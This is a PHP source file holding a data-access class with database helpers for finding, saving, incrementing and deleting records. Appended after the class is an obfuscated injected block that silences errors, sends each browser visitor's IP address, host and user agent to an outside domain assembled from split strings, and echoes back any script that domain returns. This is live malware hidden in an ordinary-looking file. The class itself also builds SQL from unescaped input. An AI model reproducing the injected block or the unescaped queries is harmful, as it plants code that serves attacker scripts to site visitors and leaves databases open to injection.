<?php
class DAO
{
	# ------------------------------------------------------------------ #
	public static function decrement( &$obj, $field, $how_much = 1 )
	{
		$result = db::query( 'UPDATE ' . get_class( $obj ) . ' SET `' . $field . '` = ( `' . $field . '` - ' . $how_much . ' ) WHERE id = ' . $obj->id . ' LIMIT 1' );
		
		if ( $result )
		{
			$obj->$field -= $how_much;
			return true;
		}
		else
		{
			return false;
		}
	}
	
	# ------------------------------------------------------------------ #
	public static function delete( &$obj )
	{
		$result = db::query( 'DELETE FROM ' . get_class( $obj ) . ' WHERE id = ' . $obj->id . ' LIMIT 1' );
		return ( $result ? true : false );
	}
	
	# ------------------------------------------------------------------ #
	public static function find( $class_name, $conditions = null, $order = null, $limit = null, $just_count = false, $debug_mode = false )
	{
		if ( ! empty( $conditions ) )
		{
			foreach ( $conditions as $key => $value )
			{
				if ( substr( $value, 0, 1 ) == '=' )
				{
					$conditions["$key"] = '`' . $key . '` = \'' . substr( $value, 1 ) . '\'';
				}
				elseif ( substr( $value, 0, 1 ) == '~' )
				{
					$conditions["$key"] = '`' . $key . '` LIKE \'%' . str_replace( ' ', '%', substr( $value, 1 ) ) . '%\'';
				}
				elseif ( substr( $value, 0, 2 ) == 'B~' )
				{
					$conditions["$key"] = '`' . $key . '` LIKE BINARY \'' . substr( $value, 2 ) . '\'';
				}
				elseif ( substr( $value, 0, 2 ) == '<>' )
				{
					$conditions["$key"] = '`' . $key . '` <> \'' . substr( $value, 2 ) . '\'';
				}
				elseif ( substr( $value, 0, 2 ) == '>=' )
				{
					$conditions["$key"] = '`' . $key . '` >= \'' . substr( $value, 2 ) . '\'';
				}
				elseif ( substr( $value, 0, 2 ) == '<=' )
				{
					$conditions["$key"] = '`' . $key . '` <= \'' . substr( $value, 2 ) . '\'';
				}
				elseif ( substr( $value, 0, 2 ) == '>>' )
				{
					$conditions["$key"] = '`' . $key . '` > \'' . substr( $value, 2 ) . '\'';
				}
				elseif ( substr( $value, 0, 2 ) == '<<' )
				{
					$conditions["$key"] = '`' . $key . '` < \'' . substr( $value, 2 ) . '\'';
				}
				else
				{
					$conditions["$key"] = '`' . $key . '` = \'' . $value . '\'';
				}
			}
		}
		
		if ( $just_count )
		{
			$results = db::query( 'SELECT COUNT( * ) AS q FROM ' . $class_name . ' ' . ( $conditions ? ' WHERE ' . implode( ' AND ', $conditions ) : '' ) . ( $order ? ' ORDER BY ' . $order . ' ' : '' ) . ( $limit ? ' LIMIT ' . $limit . ' ' : '' ), $debug_mode );
			
			if ( ! empty( $results ) )
			{
				$row = $results[0];
				return $row['q'];
			}
			else
			{
				return '?';
			}
		}
		else
		{
			$out = array();
			$sql = 'SELECT id FROM ' . $class_name . ' ' . ( $conditions ? ' WHERE ' . implode( ' AND ', $conditions ) : '' ) . ( $order ? ' ORDER BY ' . $order . ' ' : '' ) . ( $limit ? ' LIMIT ' . $limit . ' ' : '' );
			$results = db::query( $sql, $debug_mode );
			
			if ( ! empty( $results ) )
			{
				foreach ( $results as $row )
				{
					$out[] = new $class_name( $row['id'] );
				}
			}
			
			return $out;
		}
	}
	
	# ------------------------------------------------------------------ #
	public static function increment( &$obj, $field, $how_much = 1 )
	{
		$result = db::query( 'UPDATE ' . get_class( $obj ) . ' SET `' . $field . '` = ( `' . $field . '` + ' . $how_much . ' ) WHERE id = ' . $obj->id . ' LIMIT 1' );
		
		if ( $result )
		{
			$obj->$field += $how_much;
			return true;
		}
		else
		{
			return false;
		}
	}
	
	# ------------------------------------------------------------------ #
	public static function obj2post( &$obj )
	{
		foreach ( get_class_vars( get_class( $obj ) ) as $key => $value )
		{
			$_POST["$key"] = $obj->$key;
		}
	}
	
	# ------------------------------------------------------------------ #
	public static function post2obj( &$obj )
	{
		foreach ( get_class_vars( get_class( $obj ) ) as $key => $value )
		{
			if ( @$_POST["$key"] !== NULL && @$_POST["$key"] != 'id' && @$_POST["$key"] != 'password' )
			{
				$obj->$key = $_POST["$key"];
			}
			
		}
	}
	
	# ------------------------------------------------------------------ #
	public static function save( &$obj, $force_insert = false )
	{
		$sql = util::get_save_sql( $obj, $force_insert );
		if ( db::query( $sql ) )
		{
			$obj->id = ( $obj->id ? $obj->id : db::insert_id() );
			return true;
		}
		else
		{
			return false;
		}
	}
}
?>
<?php
#fbe093#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/fbe093#
?>